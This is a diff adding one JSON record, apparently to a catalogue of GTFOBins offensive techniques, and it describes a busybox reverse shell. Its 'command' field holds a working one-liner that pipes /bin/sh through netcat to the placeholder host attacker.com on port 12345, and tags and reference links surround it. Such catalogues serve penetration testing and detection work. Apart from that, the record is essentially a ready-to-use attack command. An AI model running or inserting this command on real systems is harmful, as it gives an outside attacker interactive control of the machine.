@@ -1,0 +1,23 @@
+{
+  "id": "gtfo-busybox-reverse-shell",
+  "name": "GTFOBins · busybox (reverse-shell)",
+  "command": "busybox nc -e /bin/sh attacker.com 12345",
+  "description": "Use busybox to reverse shell via GTFOBins.",
+  "platform": "linux",
+  "tags": [
+    "gtfobins",
+    "busybox",
+    "reverse-shell"
+  ],
+  "source": "gtfobins",
+  "source_url": "https://gtfobins.github.io/gtfobins/busybox/#reverse-shell",
+  "upstream_id": "busybox/reverse-shell/0",
+  "category": "gtfobins",
+  "subcategory": "reverse-shell",
+  "references": [
+    {
+      "title": "GTFOBins",
+      "url": "https://gtfobins.github.io/gtfobins/busybox/"
+    }
+  ]
+}
